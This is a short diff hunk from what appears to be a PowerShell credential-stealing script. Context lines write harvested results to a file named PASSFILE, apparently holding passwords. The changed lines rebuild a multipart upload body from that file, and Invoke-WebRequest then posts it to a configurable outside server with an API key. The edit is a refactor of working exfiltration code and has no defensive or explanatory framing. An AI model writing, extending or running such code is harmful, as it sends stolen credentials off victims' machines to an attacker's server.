@@ -40,11 +40,14 @@ $Res | Format-Table -AutoSize | Out-File -FilePath .\$PASSFILE -Encoding ASCII -
 
 # Send file to server
 $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
-$body = "--$boundary`r`n"
-$body += "Content-Disposition: form-data; name=\"file\"; filename=\"$(Split-Path $PASSFILE -Leaf)\"`r`n"
-$body += "Content-Type: application/octet-stream`r`n`r`n"
-$body += (Get-Content -Path .\$PASSFILE -Raw)
-$body += "`r`n--$boundary--`r`n"
+$body = @"
+--$boundary
+Content-Disposition: form-data; name="file"; filename="$(Split-Path $PASSFILE -Leaf)"
+Content-Type: application/octet-stream
+
+$(Get-Content -Path .\$PASSFILE -Raw)
+--$boundary--
+"@
 
 Invoke-WebRequest -Uri $SERVERSITE -Method Post -Headers @{"X-API-Key" = $APIKEY} -Body $body -ContentType "multipart/form-data; boundary=$boundary"
 
